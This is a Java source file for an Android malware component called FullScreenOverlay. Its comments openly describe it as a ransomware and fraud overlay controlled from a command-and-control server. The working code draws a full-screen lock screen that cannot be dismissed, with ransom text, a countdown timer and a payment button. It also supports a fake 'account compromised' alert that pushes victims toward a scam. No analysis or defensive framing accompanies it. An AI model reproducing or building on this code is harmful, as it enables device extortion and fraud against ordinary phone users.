package com.fason.app.features.springe.overlays;

import android.content.Context;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.fason.app.features.springe.delivery.OverlayWindowManager;

import org.json.JSONObject;

/**
 * FullScreenOverlay — Full-screen blocking overlay for ransomware or fraud.
 *
 * Types:
 * - RANSOMWARE: Locks device with ransom note, countdown timer, payment demand
 * - FRAUD_WARNING: "Your account has been compromised — call this number"
 * - CUSTOM_BLOCKER: Fully custom message and action from C2
 *
 * This overlay BLOCKS ALL user interaction except the designated action button.
 * Cannot be dismissed with Back or Home (re-appears on Home).
 *
 * Must be shown/hidden from the main thread.
 */
public final class FullScreenOverlay {

    private static final String TAG = "FullScreenOverlay";

    public static final int TYPE_RANSOMWARE = 0;
    public static final int TYPE_FRAUD_WARNING = 1;
    public static final int TYPE_CUSTOM_BLOCKER = 2;

    private final Context context;
    private final OverlayWindowManager windowManager;

    private volatile View overlayView;
    private volatile boolean isShowing = false;
    private volatile CountDownTimer countDownTimer;
    private volatile OnActionResultListener actionListener;

    public interface OnActionResultListener {
        void onAction(int type, String actionId);
    }

    public FullScreenOverlay(Context context, OverlayWindowManager windowManager) {
        this.context = context;
        this.windowManager = windowManager;
    }

    /**
     * Show a full-screen blocking overlay.
     *
     * @param type Overlay type
     * @param title Main title text
     * @param message Body message
     * @param actionText Button text
     * @param actionId Identifier sent back when button is pressed
     * @param countdownSeconds 0 = no countdown, >0 = show timer
     */
    public void show(int type, String title, String message,
                     String actionText, String actionId, int countdownSeconds) {
        if (isShowing) return;

        try {
            overlayView = createOverlay(type, title, message, actionText, actionId, countdownSeconds);
            OverlayWindowManager.OverlayConfig config =
                OverlayWindowManager.OverlayConfig.fullscreen();
            config.dimAmount = 0.0f;
            windowManager.addOverlay(overlayView, config);
            isShowing = true;

            Log.i(TAG, "Full-screen overlay shown: type=" + type
                + " countdown=" + countdownSeconds + "s");
        } catch (Exception e) {
            Log.e(TAG, "Failed to show fullscreen overlay", e);
        }
    }

    public void hide() {
        if (!isShowing || overlayView == null) return;

        if (countDownTimer != null) {
            countDownTimer.cancel();
            countDownTimer = null;
        }

        try {
            windowManager.removeOverlay(overlayView);
            overlayView = null;
        } catch (Exception e) {
            Log.e(TAG, "Error hiding fullscreen overlay", e);
        }

        isShowing = false;
    }

    public boolean isShowing() { return isShowing; }

    public void setOnActionResultListener(OnActionResultListener listener) {
        this.actionListener = listener;
    }

    public void destroy() { hide(); }

    private View createOverlay(int type, String title, String message,
                                String actionText, String actionId, int countdownSeconds) {
        // Determine color scheme based on type
        int bgColor, accentColor, textColor;
        switch (type) {
            case TYPE_RANSOMWARE:
                bgColor = Color.parseColor("#0D0D0D");
                accentColor = Color.parseColor("#FF1744"); // Red
                textColor = Color.WHITE;
                break;
            case TYPE_FRAUD_WARNING:
                bgColor = Color.parseColor("#FFF3E0");
                accentColor = Color.parseColor("#FF6D00"); // Orange
                textColor = Color.BLACK;
                break;
            default:
                bgColor = Color.parseColor("#1A1A2E");
                accentColor = Color.parseColor("#4285F4");
                textColor = Color.WHITE;
        }

        // Root layout
        FrameLayout root = new FrameLayout(context);
        root.setLayoutParams(new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.setBackgroundColor(bgColor);
        root.setClickable(true);
        root.setFocusable(true);
        root.setKeepScreenOn(true);

        // Center content
        LinearLayout content = new LinearLayout(context);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setGravity(Gravity.CENTER);

        FrameLayout.LayoutParams contentLp = new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT);
        contentLp.gravity = Gravity.CENTER;
        content.setLayoutParams(contentLp);
        content.setPadding(dpToPx(40), dpToPx(60), dpToPx(40), dpToPx(60));

        // Warning icon (emoji as fallback)
        TextView iconView = new TextView(context);
        iconView.setText(type == TYPE_RANSOMWARE ? "🔒" : "⚠️");
        iconView.setTextSize(64);
        iconView.setGravity(Gravity.CENTER);
        content.addView(iconView);

        // Spacer
        content.addView(createSpacer(20));

        // Title
        TextView titleView = new TextView(context);
        titleView.setText(title != null ? title : getDefaultTitle(type));
        titleView.setTextColor(accentColor);
        titleView.setTextSize(24);
        titleView.setTypeface(null, Typeface.BOLD);
        titleView.setGravity(Gravity.CENTER);
        titleView.setPadding(0, 0, 0, dpToPx(12));
        content.addView(titleView);

        // Message
        TextView msgView = new TextView(context);
        msgView.setText(message != null ? message : getDefaultMessage(type));
        msgView.setTextColor(textColor);
        msgView.setTextSize(16);
        msgView.setGravity(Gravity.CENTER);
        msgView.setAlpha(0.8f);
        msgView.setPadding(0, 0, 0, dpToPx(32));
        content.addView(msgView);

        // Countdown timer (if enabled)
        if (countdownSeconds > 0) {
            final TextView timerView = new TextView(context);
            timerView.setId(View.generateViewId());
            timerView.setText(formatTime(countdownSeconds));
            timerView.setTextColor(accentColor);
            timerView.setTextSize(36);
            timerView.setTypeface(null, Typeface.BOLD);
            timerView.setGravity(Gravity.CENTER);
            timerView.setPadding(0, 0, 0, dpToPx(16));
            content.addView(timerView);

            // Start countdown
            countDownTimer = new CountDownTimer(countdownSeconds * 1000L, 1000) {
                @Override
                public void onTick(long millisUntilFinished) {
                    timerView.setText(formatTime((int) (millisUntilFinished / 1000)));
                }

                @Override
                public void onFinish() {
                    timerView.setText("0:00");
                    // Auto-action on expiry
                    if (actionListener != null) {
                        actionListener.onAction(type, actionId);
                    }
                }
            }.start();
        }

        // Action button
        Button actionBtn = new Button(context);
        actionBtn.setText(actionText != null ? actionText : "Continue");
        actionBtn.setTextColor(Color.WHITE);
        actionBtn.setTextSize(16);
        actionBtn.setTypeface(null, Typeface.BOLD);
        actionBtn.setPadding(dpToPx(32), dpToPx(14), dpToPx(32), dpToPx(14));

        GradientDrawable btnBg = new GradientDrawable();
        btnBg.setShape(GradientDrawable.RECTANGLE);
        btnBg.setCornerRadius(dpToPx(28));
        btnBg.setColor(accentColor);
        actionBtn.setBackground(btnBg);

        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT);
        btnLp.gravity = Gravity.CENTER;
        actionBtn.setLayoutParams(btnLp);
        actionBtn.setElevation(dpToPx(4));

        final String fActionId = actionId;
        actionBtn.setOnClickListener(v -> {
            if (actionListener != null) {
                actionListener.onAction(type, fActionId);
            }
        });

        content.addView(actionBtn);

        root.addView(content);
        return root;
    }

    private String getDefaultTitle(int type) {
        switch (type) {
            case TYPE_RANSOMWARE: return "Device Locked";
            case TYPE_FRAUD_WARNING: return "Security Alert";
            default: return "Attention Required";
        }
    }

    private String getDefaultMessage(int type) {
        switch (type) {
            case TYPE_RANSOMWARE:
                return "Your device has been encrypted.\n"
                    + "To regain access, contact support.\n"
                    + "Do not attempt to restart your device.";
            case TYPE_FRAUD_WARNING:
                return "Suspicious activity detected on your account.\n"
                    + "Please verify your identity immediately.";
            default:
                return "";
        }
    }

    private View createSpacer(int height) {
        View spacer = new View(context);
        spacer.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dpToPx(height)));
        return spacer;
    }

    private String formatTime(int totalSeconds) {
        int minutes = totalSeconds / 60;
        int seconds = totalSeconds % 60;
        return minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
    }

    private int dpToPx(int dp) {
        return (int) (dp * context.getResources().getDisplayMetrics().density + 0.5f);
    }
}
